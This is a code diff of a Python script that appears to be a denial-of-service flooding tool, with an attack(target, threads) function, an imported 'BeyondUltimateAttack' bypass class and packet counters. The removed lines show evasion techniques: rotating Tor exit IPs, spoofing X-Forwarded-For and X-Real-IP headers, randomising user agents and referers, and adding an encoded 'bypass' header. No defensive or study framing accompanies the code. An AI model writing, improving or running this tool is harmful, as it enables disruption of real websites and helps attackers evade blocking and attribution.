@@ -1,61 +1,24 @@
 import threading
 import random
 import time
-import ssl
-import socket
-import requests
-import httpx
-import socks
-import asyncio
-import websockets
-import base64
-import json
 import sys
-import undetected_chromedriver as uc
-from fake_useragent import UserAgent
-from stem.control import Controller
-from stem import Signal
-from OpenSSL import SSL
 from bypass import BeyondUltimateAttack
 
 packet_count = 0  
 lock = threading.Lock()
 speed = 0.01
-packet = 9550000  
-byte = 9500000    
-clone_factor = 1000000000  
+packet = 95500  
+byte = 95000    
+clone_factor = 10  
 target_status = "Unknown"  
-ua = UserAgent()
-
-referers = [
-    "https://google.com", "https://bing.com", "https://yahoo.com",
-    "https://duckduckgo.com", "https://baidu.com", "https://yandex.com"
-]
-
-def new_tor_ip():
-    with Controller.from_port(port=9051) as controller:
-        controller.authenticate(password="tor_password")
-        controller.signal(Signal.NEWNYM)
-
-def generate_headers():
-    spoofed_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
-    encoded_payload = base64.b64encode(b"bypass_payload").decode()
-    return {
-        "User-Agent": ua.random,
-        "Referer": random.choice(referers),
-        "X-Forwarded-For": spoofed_ip,  
-        "X-Real-IP": spoofed_ip,
-        "Cache-Control": "no-cache",
-        "Pragma": "no-cache",
-        "Connection": "keep-alive",
-        "Accept-Encoding": "gzip, deflate",
-        "X-Payload": encoded_payload
-    }
 
 def attack(target, threads):
     global packet_count
     stop_event = threading.Event()
     thread_list = []
+
+    if not target.startswith(("http://", "https://")):  
+        target = f"http://{target}"  
 
     packet_count = threads  
     print(f"\r[*] Total Packets Sent: {packet_count} | Target Status: {target_status}", end="", flush=True)  
